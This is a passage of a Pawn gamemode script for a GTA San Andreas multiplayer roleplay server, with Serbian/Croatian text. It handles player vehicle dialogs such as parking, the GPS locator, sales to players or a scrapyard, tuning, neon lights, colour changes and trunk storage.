					    SCM( playerid, ANTICHEAT, "| V:AC | Vase vozilo ne postoji u bazi podataka, obratite se na forumu ako mislite je greska." );
					}
				}
				case 1: {
				    if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == -1) return SendErrorMessage( playerid, "Ti ne posedujes vozilo u ovom slotu.");
				    if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == 0 ) return SendErrorMessage( playerid, "Ti ne posedujes vozilo u ovom slotu.");
                    new vFile[ 50 ];
			        format( vFile, sizeof( vFile ), V_FILE, PlayerInfo[ playerid ][ xVoziloID ][ 1 ] );
			        if( fexist( vFile ) ) {
						if( strcmp( ImeIgraca( playerid ), VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 1 ] ][ vOwner ], true ) == 0 ) {
							ChosenVehicle[ playerid ] = PlayerInfo[ playerid ][ xVoziloID ][ 1 ];
	                        SPD( playerid, dialog_VEHCHOSEN, DSL, "Vozilo", "Informacije\nParkiraj\nLociraj\nUgradi GPS\nProdaj igracu\nProdaj otpadu\nMakni tuning\nNeon\nGepek\nPromeni boju", "Odaberi", "Nazad" );
	                    }
	                    else {
							SCM( playerid, ANTICHEAT, "| V:AC | Ovo vozilo nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
						}
					}
					else {
					    SCM( playerid, ANTICHEAT, "| V:AC | Vase vozilo ne postoji u bazi podataka, obratite se na forumu ako mislite je greska." );
					}
				}
				case 2: {
				    if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == -1) return SendErrorMessage( playerid, "Ti ne posedujes vozilo u ovom slotu.");
                    if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == 0 ) return SendErrorMessage( playerid, "Ti ne posedujes vozilo u ovom slotu.");
					new vFile[ 50 ];
			        format( vFile, sizeof( vFile ), V_FILE, PlayerInfo[ playerid ][ xVoziloID ][ 2 ] );
			        if( fexist( vFile ) ) {
						if( strcmp( ImeIgraca( playerid ), VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 2 ] ][ vOwner ], true ) == 0 ) {
							ChosenVehicle[ playerid ] = PlayerInfo[ playerid ][ xVoziloID ][ 2 ];
	                        SPD( playerid, dialog_VEHCHOSEN, DSL, "Vozilo", "Informacije\nParkiraj\nLociraj\nUgradi GPS\nProdaj igracu\nProdaj otpadu\nMakni tuning\nNeon\nGepek\nPromeni boju", "Odaberi", "Nazad" );
	                    }
	                    else {
							SCM( playerid, ANTICHEAT, "| V:AC | Ovo vozilo nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
						}
					}
					else {
					    SCM( playerid, ANTICHEAT, "| V:AC | Vase vozilo ne postoji u bazi podataka, obratite se na forumu ako mislite je greska." );
					}
				}
				case 3: {
				    if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == -1) return SendErrorMessage( playerid, "Ti ne posedujes vozilo u ovom slotu.");
                    if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == 0 ) return SendErrorMessage( playerid, "Ti ne posedujes vozilo u ovom slotu.");
					new vFile[ 50 ];
			        format( vFile, sizeof( vFile ), V_FILE, PlayerInfo[ playerid ][ xVoziloID ][ 3 ] );
			        if( fexist( vFile ) ) {
						if( strcmp( ImeIgraca( playerid ), VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 3 ] ][ vOwner ], true ) == 0 ) {
							ChosenVehicle[ playerid ] = PlayerInfo[ playerid ][ xVoziloID ][ 3 ];
	                        SPD( playerid, dialog_VEHCHOSEN, DSL, "Vozilo", "Informacije\nParkiraj\nLociraj\nUgradi GPS\nProdaj igracu\nProdaj otpadu\nMakni tuning\nNeon\nGepek\nPromeni boju", "Odaberi", "Nazad" );
	                    }
	                    else {
							SCM( playerid, ANTICHEAT, "| V:AC | Ovo vozilo nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
						}
					}
					else {
					    SCM( playerid, ANTICHEAT, "| V:AC | Vase vozilo ne postoji u bazi podataka, obratite se na forumu ako mislite je greska." );
					}
				}
			}
		}
	}
	else if( dialogid == dialog_VEHCHOSEN ) {
	    if( !response ) return 1;
		if( response ) {
			switch( listitem ) {
			    case 0: {
			        new izbor = ChosenVehicle[ playerid ];
			        
					if( !IsPlayerInVehicle( playerid, VehicleInfo[ izbor ][ vID ] ) ) return SendErrorMessage( playerid, "Morate biti u svom vozilu!");
                    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
					format( globalstring, sizeof( globalstring ), ""col_white"___________"col_crvena"Vozilo: "col_white"%s ["col_crvena"Model ID: "col_white"%d]___________\n\n", ImeVozila[ VehicleInfo[ izbor ][ vModel ]-400 ],  VehicleInfo[ izbor ][ vModel ] );
					strcat( DialogStrgEx, globalstring);
			        new tablice[ 50 ];
					if( 10 > VehicleInfo[ izbor ][ vID ] ) { format( tablice, sizeof( tablice ), "LS 000%d.", VehicleInfo[ izbor ][ vID ] ); }
					else if( 10 <= VehicleInfo[ izbor ][ vID ] && VehicleInfo[ izbor ][ vID ] < 100 ) { format( tablice , sizeof( tablice ), "LS 00%d.", VehicleInfo[ izbor ][ vID ] ); }
					else if( 100 <= VehicleInfo[ izbor ][ vID ] && VehicleInfo[ izbor ][ vID ] < 1000 ) { format( tablice, sizeof( tablice ), "LS 0%d.", VehicleInfo[ izbor ][ vID ] ); }
			        else if( 1000 <= VehicleInfo[ izbor ][ vID ] && VehicleInfo[ izbor ][ vID ] < 2001 ) { format( tablice, sizeof( tablice ), "LS %d.", VehicleInfo[ izbor ][ vID ] ); }
					if( VehicleInfo[ izbor ][ vReg ] != 0) {
					    format( globalstring, sizeof( globalstring ), ""col_crvena"Registracija: "col_white"%s\n",  tablice );
						strcat( DialogStrgEx, globalstring);
					} else strcat( DialogStrgEx, "Neregistriran\n" );
                    strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
					if( VehicleInfo[ izbor ][ vLocked ] == 1)
						strcat( DialogStrgEx, ""col_crvena"Status brave: "col_white"Zakljucano\n");
					else
						strcat( DialogStrgEx, ""col_crvena"Status brave: "col_white"Otkljucano\n");
                    strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
                    format( globalstring, sizeof( globalstring ), ""col_crvena"Vrsta goriva: "col_white"%s\n", GetVehicleFuelType( VehicleInfo[ izbor ][ vID ] ) );
					strcat( DialogStrgEx, globalstring);
                    strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
                    format( globalstring, sizeof( globalstring ), ""col_crvena"Predjena kilometraza: "col_white"%d\n", VehicleInfo[ izbor ][ vKilometri ] );
					strcat( DialogStrgEx, globalstring);
                    strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
					if( VehicleInfo[ izbor ][ vLock ] == 0)
						strcat( DialogStrgEx, ""col_crvena"Kvaliteta brave: "col_white"Nekvalitetna\n");
					else {
						format( globalstring, sizeof( globalstring ), ""col_crvena"Kvaliteta brave: "col_white"%d\n",  VehicleInfo[ izbor ][ vLock ] );
						strcat( DialogStrgEx, globalstring);
					}
                    strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
			        if( VehicleInfo[ izbor ][ vImobilizator ] == 0)
						strcat( DialogStrgEx, ""col_crvena"Imobilizator: "col_white"Nekvalitetan\n");
					else {
					    format( globalstring, sizeof( globalstring ), ""col_crvena"Imobilizator level: "col_white"%d\n",  VehicleInfo[ izbor ][ vImobilizator ] );
						SCM( playerid, BELA, globalstring);
					}
					strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
			        if( VehicleInfo[ izbor ][ vGPS ] > 0) {
					    if( VehicleInfo[ izbor ][ vGPS ] == 1)
					    	strcat( DialogStrgEx, ""col_crvena"GPS: "col_white"Jednostavan\n");
						else if( VehicleInfo[ izbor ][ vGPS ] == 2)
			                strcat( DialogStrgEx, ""col_crvena"GPS: "col_white"Napredan\n");
					} else strcat( DialogStrgEx, ""col_crvena"GPS: "col_white"Nema\n");
    
					strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________");
					SPD( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "Potvrdi", "" );
	    			strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
				}
			    case 1: {
			        new izbor = ChosenVehicle[ playerid ], Float:HP, Float:Pos[ 4 ];

					if( !IsPlayerInVehicle( playerid, VehicleInfo[ izbor ][ vID ] ) ) return SendErrorMessage( playerid, "Morate biti u svom vozilu!");
                    if( GetPlayerVehicleSeat( playerid ) != 0) return SendErrorMessage( playerid, "Morate biti u svom vozilu na vozackom mjestu!");
                    if( IsPlayerInArea( playerid, 1486.062, -1776.608, 1653.387, -1567.377 ) ) return SendErrorMessage( playerid, "Ne mozete parkirati auto u blizini policije!");
					if( IsPlayerInArea( playerid, 1136.201, -1014.694, 1311.132, -856.7839 ) ) return SendErrorMessage( playerid, "Ne mozete parkirati auto u blizini burga!");
					if( IsPlayerInArea( playerid, 1383.386, -1077.857, 1554.513, -947.582 ) ) return SendErrorMessage (playerid, "Ne mozete parkirati auto u blizini banke!");
                    GetVehicleHealth( GetPlayerVehicleID( playerid ), HP );
					if( HP < 800.0 ) return SendErrorMessage( playerid, "Motor vam je previse ostecen, ne mozete ga parkirati.");

                    GetVehiclePos( VehicleInfo[ izbor ][ vID ], Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
					GetVehicleZAngle( VehicleInfo[ izbor ][ vID ], Pos[ 3 ] );
                    
                    VehicleInfo[ izbor ][ vVirtualWorld ] = GetPlayerVirtualWorld( playerid );
					VehicleInfo[ izbor ][ vInterior ] = GetPlayerInterior( playerid );
					
					VehicleInfo[ izbor ][ vLokacijaX ] = Pos[ 0 ];
					VehicleInfo[ izbor ][ vLokacijaY ] = Pos[ 1 ];
					VehicleInfo[ izbor ][ vLokacijaZ ] = Pos[ 2 ];
					VehicleInfo[ izbor ][ vLokacijaA ] = Pos[ 3 ];

                    Novi_DestroyVehicle( VehicleInfo[ izbor ][ vID ] );
					VehicleInfo[ izbor ][ vID ] = V01D_CreateVehicle(VehicleInfo[ izbor ][ vModel ], VehicleInfo[ izbor ][ vLokacijaX ], VehicleInfo[ izbor ][ vLokacijaY ], VehicleInfo[ izbor ][ vLokacijaZ ]+1.0, VehicleInfo[ izbor ][ vLokacijaA ], VehicleInfo[ izbor ][ vColor1 ], VehicleInfo[ izbor ][ vColor2 ], 300000 );
					LinkVehicleToInterior( VehicleInfo[ izbor ][ vID ], VehicleInfo[ izbor ][ vInterior ] );
    				SetVehicleVirtualWorld( VehicleInfo[ izbor ][ vID ], VehicleInfo[ izbor ][ vVirtualWorld ] );

                    TuneVehicle( izbor );
                    
	     			SetVehicleParamsEx( VehicleInfo[ izbor ][ vID ], 0, 0, 0, VehicleInfo[ izbor ][ vLocked ], 0, 0, 0 );
		            if( IsVehicleBajs( VehicleInfo[ izbor ][ vID ] ) ) {
						SetVehicleParamsEx( VehicleInfo[ izbor ][ vID ], 1, 0, 0, VehicleInfo[ izbor ][ vLocked ], 0, 0, 0 );
					}

					SaveVehicle( izbor );
					
					SendInfoMessage( playerid, "Uspesno ste parkirali vozilo!");
			    }
			    case 2: {
			        new izbor = ChosenVehicle[ playerid ];
					if( VehicleInfo[ izbor ][ vGPS ] == 0 ) return SendErrorMessage( playerid, "Ne posjedujete GPS na ovom vozilu.");
					if( GetPVarInt( playerid, "LocatingCar" ) == 0 ) {
			  			GameTextForPlayer( playerid, "~y~spajanje na satelit...", 4000, 1);
				        SetPVarInt( playerid, "GPSConnectTimer", SetTimerEx("GPSConnect", 5000, 0, "iii", playerid, 1, VehicleInfo[ izbor ][ vID ] ) );
				        SetPVarInt( playerid, "GPSTimerCalled", 1);
					}
					else if(GetPVarInt( playerid, "LocatingCar") == 1) {
				 		SetPVarInt( playerid, "LocatingCar", 0);
						GameTextForPlayer( playerid, "~r~gps ugasen", 4500, 1);
						CheckpointStatus[ playerid ] = 0;
						PlayerPlaySound( playerid, 1145, 0.0, 0.0, 0.0);
						Novi_DisablePlayerCheckpoint( playerid );
					}
			    }
			    case 3: {
			        new izbor = ChosenVehicle[ playerid ];
					if( !IsPlayerInVehicle( playerid, VehicleInfo[ izbor ][ vID ] ) ) return SendErrorMessage( playerid, "Morate biti u svom vozilu!");
					if( VehicleInfo[ izbor ][ vGPS ] == 2 ) return SendErrorMessage( playerid, "Vase vozilo vec ima najbolji gps!");
					if( KupljenGPS[ playerid ] != 1 ) return SendErrorMessage( playerid, "Prvo trebate kupiti GPS u Gigatronu." );
				    VehicleInfo[ izbor ][ vGPS ] ++; SaveVehicle( izbor );
					SCM( playerid, SVETLOPLAVA, "Uspesno si unapredio svoj GPS sistem." );
			    }
			    case 4: {
			        new izbor = ChosenVehicle[ playerid ];
			        if( !IsPlayerInVehicle( playerid, VehicleInfo[ izbor ][ vID ] ) ) return SendErrorMessage( playerid, "Morate biti u svom vozilu!");
                    SPD( playerid, dialog_VEHSELLTP, DSI, D_NASLOV, "Unesite id igraca kome zelite da prodate vozilo i cenu.\nPrimer: 145 12003", D_ODABERI, D_ODUSTANI );
			    }
			    case 5: {
			        new izbor = ChosenVehicle[ playerid ];
     				if( !IsPlayerInVehicle( playerid, VehicleInfo[ izbor ][ vID ] ) ) return SendErrorMessage( playerid, "Morate biti u svom vozilu!");
                    if(ProdajeImovinu[playerid]) return SendErrorMessage(playerid, "Ne mozes to dok cekas odgovor na prodaju igracu!");
			        if( !IsPlayerInRangeOfPoint( playerid, 10.0, 2262.7529,2036.0621,10.8203 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morati biti na vagi na otpadu." );

                    new string1[ 128 ]; 
					format( string1, sizeof( string1 ), "Igrac %s je prodao vozilo %s na otpad", ImeIgraca( playerid ), GetVehicleNameEx( VehicleInfo[ izbor ][ vModel ] ) );
					LogSave( "Ostalo/LogProdajaVozila.log", string1 );

			        DajIgracuNovac( playerid, VehicleInfo[ izbor ][ vPrice ]/2 );
					SendClientMessageEx( playerid, ZUTA, "Dobili ste %d$ od otpada za ovo vozilo.", VehicleInfo[ izbor ][ vPrice ]/2 );

					if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == VehicleInfo[ izbor ][ vProvera ] ) { PlayerInfo[ playerid ][ xVoziloID ][ 0 ] = -1; }
				    else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == VehicleInfo[ izbor ][ vProvera ] ) { PlayerInfo[ playerid ][ xVoziloID ][ 1 ] = -1; }
				    else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == VehicleInfo[ izbor ][ vProvera ] ) { PlayerInfo[ playerid ][ xVoziloID ][ 2 ] = -1; }
				    else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == VehicleInfo[ izbor ][ vProvera ] ) { PlayerInfo[ playerid ][ xVoziloID ][ 3 ] = -1; }

					SavePlayer( playerid );
					// Novi_DestroyVehicle( VehicleInfo[ izbor ][ vID ] );
     //                ObrisiVozilo(VehicleInfo[izbor][vID]);

                    new autoid = getVehicleScriptID(GetPlayerVehicleID(playerid));

                    Novi_DestroyVehicle( VehicleInfo[ autoid ][ vID ] );
                    ResetVehicle( autoid );
                    ObrisiVozilo( autoid );

					SCM( playerid, BELA, "Vase vozilo je uspesno prodano na otpad!");
			    }
			    case 6: {
			        new izbor = ChosenVehicle[ playerid ];
					if( !IsPlayerInVehicle( playerid, VehicleInfo[ izbor ][ vID ] ) ) return SendErrorMessage( playerid, "Morate biti u svom vozilu!");

					if( Neon[ VehicleInfo[ izbor ][ vID ] ] == 1) {
				 		Neon[ VehicleInfo[ izbor ][ vID ] ] = 0;
					    DestroyDynamicObject( NeonObject1[ VehicleInfo[ izbor ][ vID ] ] );
				     	DestroyDynamicObject( NeonObject2[ VehicleInfo[ izbor ][ vID ] ] );
					}

					VehicleInfo[ izbor ][ vNeon ] = 0;
				    VehicleInfo[ izbor ][ vTuned ] = 0;
				    VehicleInfo[ izbor ][ vImobilizator ] = 0;
				    VehicleInfo[ izbor ][ vSpoiler ] = 0;
				    VehicleInfo[ izbor ][ vHood ] = 0;
				    VehicleInfo[ izbor ][ vRoof ] = 0;
				    VehicleInfo[ izbor ][ vSkirt ] = 0;
				    VehicleInfo[ izbor ][ vLamps ] = 0;
				    VehicleInfo[ izbor ][ vNitro ] = 0;
				    VehicleInfo[ izbor ][ vExhaust ] = 0;
				    VehicleInfo[ izbor ][ vWheels ] = 0;
				    VehicleInfo[ izbor ][ vStereo ] = 0;
				    VehicleInfo[ izbor ][ vHydraulics ] = 0;
				    VehicleInfo[ izbor ][ vFrontBumper ] = 0;
				    VehicleInfo[ izbor ][ vRearBumper ] = 0;
				    VehicleInfo[ izbor ][ vVents ] = 0;
				    VehicleInfo[ izbor ][ vPaintJob ] = 255;
				    ChangeVehiclePaintjob( VehicleInfo[ izbor ][ vID ], 3 );
				    new componentid;

					for( new i; i < 14; i++ ) {
					    componentid = GetVehicleComponentInSlot( VehicleInfo[ izbor ][ vID ], i );
					    if( componentid != 0 )
					        RemoveVehicleComponent( VehicleInfo[ izbor ][ vID ], componentid );
					}

					SCM( playerid, SVETLOCRVENA, "Skinuli ste tuning sa vozila." );
					SaveVehicle( izbor );
			    }
			    case 7: {
			        new izbor = ChosenVehicle[ playerid ];
					if( !IsPlayerInVehicle( playerid, VehicleInfo[ izbor ][ vID ] ) ) return SendErrorMessage( playerid, "Morate biti u svom vozilu!");
				    if( GetPlayerVehicleSeat( playerid ) != 0) return SendErrorMessage( playerid, "Morate biti u svom vozilu na vozackom mjestu!");
				    if( VehicleInfo[ izbor ][ vNeon ] == 0 ) return SendErrorMessage( playerid, "Na ovom vozilu nije ugradjena neonka!");
					if( Neon[ VehicleInfo[ izbor ][ vID ] ] == 0 ) {
						Neon[ VehicleInfo[ izbor ][ vID ] ] = 1;
			          	NeonObject1[ VehicleInfo[ izbor ][ vID ] ] = CreateDynamicObject( VehicleInfo[ izbor ][ vNeon ], 0, 0, 1500, 0, 0, 0 );
			            NeonObject2[ VehicleInfo[ izbor ][ vID ] ] = CreateDynamicObject( VehicleInfo[ izbor ][ vNeon ], 0, 0, 1500, 0, 0, 0 );
			          	AttachDynamicObjectToVehicle( NeonObject1[ VehicleInfo[ izbor ][ vID ] ],  VehicleInfo[ izbor ][ vID ] , -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
			          	AttachDynamicObjectToVehicle( NeonObject2[ VehicleInfo[ izbor ][ vID ] ],  VehicleInfo[ izbor ][ vID ] , 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
						format( globalstring, sizeof( globalstring ), "* %s pritisce dugme na komodi i postavlja neonke.", ImeIgraca( playerid ) );
			            PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );
					}
			        else if( Neon[ VehicleInfo[ izbor ][ vID ] ] == 1 ) {
			            Neon[ VehicleInfo[ izbor ][ vID ] ] = 0;
			            DestroyDynamicObject( NeonObject1[ VehicleInfo[ izbor ][ vID ] ] );
			            DestroyDynamicObject( NeonObject2[ VehicleInfo[ izbor ][ vID ] ] );
			            format( globalstring, sizeof( globalstring ), "* %s pritisce gumb na komodi i uvlaci neonke.", ImeIgraca( playerid ) );
			            PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );
			        }
			    }
			    case 8: {
			        SendInfoMessage( playerid, "Koristite /gepek za upravljanje gepekom." );
			    }
			    case 9: {
			        SPD( playerid, dialog_VEHCOLOR, DSI, D_NASLOV, "Unesi id boje 1 i id boje 2 vozila.\nPrimer: 1 2", D_ODABERI, D_ODUSTANI );
			    }
			}
            return SendErrorMessage(playerid, "Iskljucena opcija do 30.01.2022");
		}
	}
	else if( dialogid == dialog_ACCEPTVEH ) {
	    if( response ) {
	    
            new seller = GlobalProdaja[ playerid ];
	 		new autoid = GlobalID[ playerid ];
	 		
	 		if( seller == IPI  ) return SendErrorMessage( playerid, "Taj igrac je offline.");
	 		if( carspawntimer == 1 ) return SendErrorMessage( playerid, "Netko je spawnao/parkirao vozilo prije vas.Pokusajte za 3 sekunde. (Anticrash)");
	        if( PlayerInfo[ seller ][ xVoziloID ][ 0 ] != autoid && PlayerInfo[ seller ][ xVoziloID ][ 1 ] != autoid && PlayerInfo[ seller ][ xVoziloID ][ 2 ] != autoid && PlayerInfo[ seller ][ xVoziloID ][ 3 ] != autoid ) return SendErrorMessage( playerid, "To vozilo nije u vlasnistvu igraca koji vam ga je ponudio!");
			if( !IsPlayerNearPlayer(5.0, playerid, seller ) ) return SendErrorMessage( playerid, "Niste blizu igraca koji vam zeli prodati vozilo.");
			if( PlayerInfo[ playerid ][ xNovac ] < GlobalCena[ playerid ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca za kupiti vozilo.");
			if( !IsPlayerConnected( seller ) ) {
				SendErrorMessage( playerid, "Taj igrac je offline.");
				GlobalProdaja[ playerid ] = -1;
				GlobalCena[ playerid ] = -1;
				GlobalID[ playerid ] = -1;
				return 1;
			}

			if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == -1 ) { }
	        else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == -1 ) { }
	        else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == -1 ) { }
	        else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == -1 ) {
				if( PlayerInfo[ playerid ][ xDonatorSlot ] == true ) { }
				else return SendErrorMessage( playerid, "Svi slotovi vozila su vam zauzeti." );
			}
			else return SendErrorMessage( playerid, "Svi slotovi vozila su vam zauzeti." );

			strmid( VehicleInfo[ autoid ][ vOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 24);

			if( PlayerInfo[ seller ][ xVoziloID ][ 0 ] == VehicleInfo[ autoid ][ vProvera ] ) { PlayerInfo[ seller ][ xVoziloID ][ 0 ] = -1; }
		    else if( PlayerInfo[ seller ][ xVoziloID ][ 1 ] == VehicleInfo[ autoid ][ vProvera ] ) { PlayerInfo[ seller ][ xVoziloID ][ 1 ] = -1; }
		    else if( PlayerInfo[ seller ][ xVoziloID ][ 2 ] == VehicleInfo[ autoid ][ vProvera ] ) { PlayerInfo[ seller ][ xVoziloID ][ 2 ] = -1; }
		    else if( PlayerInfo[ seller ][ xVoziloID ][ 3 ] == VehicleInfo[ autoid ][ vProvera ] ) { PlayerInfo[ seller ][ xVoziloID ][ 3 ] = -1; }

			if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == -1){ PlayerInfo[ playerid ][ xVoziloID ][ 0 ] = autoid;}
			else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == -1) { PlayerInfo[ playerid ][ xVoziloID ][ 1 ] = autoid; }
			else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == -1) { PlayerInfo[ playerid ][ xVoziloID ][ 2 ] = autoid; }
			else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == -1) { PlayerInfo[ playerid ][ xVoziloID ][ 3 ] = autoid; }

	        new string1[ 128 ]; 
			format( string1, sizeof( string1 ), "Igrac %s je prodao vozilo %s igracu %s za %d", ImeIgraca( seller ), GetVehicleNameEx( VehicleInfo[ autoid ][ vModel ] ), ImeIgraca( playerid ), GlobalCena[ playerid ] );
			LogSave( "Ostalo/LogProdajaVozila.log", string1 );

			SaveVehicle( autoid );
			DajIgracuNovac( seller, GlobalCena[ playerid ] );
			Novi_RemovePlayerFromVehicle( seller );
            ProdajeImovinu[seller] = false;

			DajIgracuNovac( playerid, -GlobalCena[ playerid ] );
			SendInfoMessage( playerid, "Uspesno ste kupili vozilo." );
			SendInfoMessage( seller, "Uspesno ste prodali vozilo." );

	        carspawntimer = 1;
			SetTimer("AntiSpawnCrash", 3000, 0);
			
			GlobalProdaja[ playerid ] = -1;
			GlobalCena[ playerid ] = -1;
			GlobalID[ playerid ] = -1;
	    }
	    else if( !response ) {
			format( globalstring, sizeof( globalstring ),"Igrac %s je odbio vasu ponudu za kupovinu vozla!", ImeIgraca( playerid ) );
			SCM( GlobalProdaja[ playerid ], -1, globalstring );
			SCM( playerid, -1, "Odbili ste ponudu!");
            ProdajeImovinu[GlobalProdaja[ playerid ]] = false;
			GlobalProdaja[ playerid ] = -1;
			GlobalCena[ playerid ] = -1;
			GlobalID[ playerid ] = -1;
	    }
	}
	else if( dialogid == dialog_VEHSELLTP ) {
	    if( !response ) return 1;
		if( response ) {
	        new idigraca, string[ 128 ], cena, autoid = ChosenVehicle[ playerid ];
			if( sscanf( inputtext, "ui", idigraca, cena ) ) return SPD( playerid, dialog_VEHSELLTP, DSI, D_NASLOV, "Unesite id igraca kome zelite da prodate vozilo i cenu.\nPrimer: 145 12003", D_ODABERI, D_ODUSTANI );
			if( !IsPlayerConnected( idigraca ) || idigraca == INVALID_PLAYER_ID ) return SendErrorMessage( playerid, "Nevaljan ID igraca.");
			if( !IsPlayerNearPlayer( 5.0, playerid, idigraca ) ) return SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
            if( idigraca == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebi prodati vozilo!");

	        if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == autoid ) { }
	        else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == autoid ) { }
	        else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == autoid ) { }
	        else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == autoid ) { }
			else return SendErrorMessage( playerid, "Broj vozila koji ste uneli nije u vasem vlasnistvu." );

	        if( PlayerInfo[ idigraca ][ xVoziloID ][ 0 ] == -1 ) { }
	        else if( PlayerInfo[ idigraca ][ xVoziloID ][ 1 ] == -1 ) { }
	        else if( PlayerInfo[ idigraca ][ xVoziloID ][ 2 ] == -1 ) { }
	        else if( PlayerInfo[ idigraca ][ xVoziloID ][ 3 ] == -1 ) {
				if( PlayerInfo[ idigraca ][ xDonatorSlot ] == true ) { }
				else return SendErrorMessage( playerid, "Svi slotovi vozila izabranog igraca su zauzeti." );
			}
			else return SendErrorMessage( playerid, "Svi slotovi vozila izabranog igraca su zauzeti." );

			if( cena < ( VehicleInfo[ autoid ][ vPrice ]/2 ) ) return SendErrorMessage( playerid, "Cena mora biti veca od polovine kupljene.");

	        if( !IsVehicleBajs( VehicleInfo[ autoid ][ vID ] ) ) {
				if( PlayerInfo[ idigraca ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Igrac mora biti level 5+ da bi ste mu prodali vozilo." );
			}

            SendClientMessageEx( playerid, SVETLOPLAVA, "Ponudili ste igracu %s vozilo po ceni od %d.", ImeIgraca( idigraca ), cena );
            ProdajeImovinu[playerid] = true;
			GlobalProdaja[ idigraca ] = playerid;
			GlobalCena[ idigraca ] = cena;
			GlobalID[ idigraca ] = autoid;
			format( string, sizeof( string ), "Igrac %s vam je ponudio da kupite njegovo vozilo marke %s za %d", ImeIgraca( playerid ), GetVehicleNameEx( VehicleInfo[ autoid ][ vModel ] ), cena );
			SPD( idigraca, dialog_ACCEPTVEH, DSMSG, D_NASLOV, string, "Prihvati", "Odbij" );

	    }
	}
	else if( dialogid == dialog_VEHCOLOR ) {
	    if( !response ) return 1;
		if( response ) {
		    new boja1, boja2, izbor = ChosenVehicle[ playerid ];
		    if( sscanf( inputtext, "ii", boja1, boja2 ) ) SPD( playerid, dialog_VEHCOLOR, DSI, D_NASLOV, "Unesi id boje 1 i id boje 2 vozila.\nPrimer: 1 2", D_ODABERI, D_ODUSTANI );

	        if( boja1 < 0 || boja1 > 255 ) return SendErrorMessage( playerid, "Prva boja ne moze biti manja od 0 ili veca od 255.");
	    	if( boja2 < 0 || boja2 > 255 ) return SendErrorMessage( playerid, "Druga boja ne moze biti manja od 0 ili veca od 255.");

            if( !IsPlayerInVehicle( playerid, VehicleInfo[ izbor ][ vID ] ) ) return SendErrorMessage( playerid, "Morate biti u svom vozilu!");

			VehicleInfo[ izbor ][ vColor1 ] = boja1;
		    VehicleInfo[ izbor ][ vColor2 ] = boja2;
		    SaveVehicle( izbor );

			ChangeVehicleColor( VehicleInfo[ izbor ][ vID ], boja1, boja2 );
			SendInfoMessage( playerid, "Promenili ste boju vozila u %d, %d.", boja1, boja2 );
		}
	}
	else if( dialogid == dialog_VEHICLEPUTDRUG ) {
	    if( !response ) return 1;
		if( response ) {
		    new slot, slot2, kolicina, izbor = ChosenVehicle[ playerid ];
		    if( sscanf( inputtext, "dd", slot, kolicina ) ) return SPD( playerid, dialog_VEHICLEPUTDRUG, DSI, D_NASLOV, "Unesite slot droge kod igraca i kolicinu droge za ostavljanje.\nPrimer: 1 232.", D_ODABERI, D_ODUSTANI );

            if( slot < 1 || slot > 5 ) return SendErrorMessage( playerid, "Krivi broj slota!");
			slot2 = slot-1;
		    if( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] == 0 ) return SendErrorMessage( playerid, "Nemate droge pod tim slotom!" );
		    if( kolicina < 1 || kolicina > PlayerInfo[ playerid ][ xDrug ][ slot2 ] ) return SendErrorMessage( playerid, "Nemate toliko droge pod tim slotom!");
            if( kolicina > 500 ) return SendErrorMessage( playerid, "Najvise u 1 slotu gepeka moze stati 500g droge." );
			if( VehicleInfo[ izbor ][ vDrugCode ][ 0 ] != 0 && VehicleInfo[ izbor ][ vDrugCode ][ 1 ] != 0 && VehicleInfo[ izbor ][ vDrugCode ][ 2 ] != 0 && VehicleInfo[ izbor ][ vDrugCode ][ 3 ] != 0 && VehicleInfo[ izbor ][ vDrugCode ][ 4 ] != 0 &&
				VehicleInfo[ izbor ][ vDrugCode ][ 5 ] != 0 ) return SendErrorMessage( playerid, "Svih 6 slotova droge u autu su zauzeti!");

            PlayerInfo[ playerid ][ xDrug ][ slot2 ] -= kolicina;
